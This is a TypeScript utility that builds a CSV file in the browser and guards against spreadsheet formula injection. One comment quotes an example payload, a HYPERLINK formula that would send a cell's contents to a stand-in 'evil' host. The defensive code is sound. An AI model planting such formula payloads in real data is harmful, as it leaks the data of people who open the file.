export interface CsvColumn<T> {
  header: string;
  value: (row: T) => string | number | null | undefined;
}

/**
 * Build a CSV string from rows + column definitions and trigger a browser download.
 * Pure client-side — no backend or external dependency needed.
 */
export function exportToCsv<T>(filename: string, rows: T[], columns: CsvColumn<T>[]): void {
  const escape = (val: string | number | null | undefined): string => {
    let s = val === null || val === undefined ? '' : String(val);

    // Neutralise spreadsheet formula injection. Cell values come from user-supplied
    // fields (names, task titles), and Excel/Sheets execute any cell starting with
    // one of these characters — so a user named `=HYPERLINK("http://evil/?x="&A1)`
    // would run against whoever opens the export. Prefixing with a single quote
    // makes the cell literal text; the leading quote is not displayed.
    if (/^[=+\-@\t\r]/.test(s)) {
      s = `'${s}`;
    }

    // Wrap in quotes and double any embedded quotes when the value contains a
    // comma, quote, or any line-break character (\r alone would otherwise break
    // row alignment, since rows are joined with \r\n).
    if (/[",\n\r]/.test(s)) {
      return `"${s.replace(/"/g, '""')}"`;
    }

    return s;
  };

  const headerLine = columns.map(c => escape(c.header)).join(',');
  const dataLines = rows.map(row => columns.map(c => escape(c.value(row))).join(','));
  const csv = [headerLine, ...dataLines].join('\r\n');

  // Prepend BOM so Excel opens UTF-8 correctly
  const blob = new Blob(['﻿' + csv], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = filename.endsWith('.csv') ? filename : `${filename}.csv`;
  link.style.display = 'none';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
}
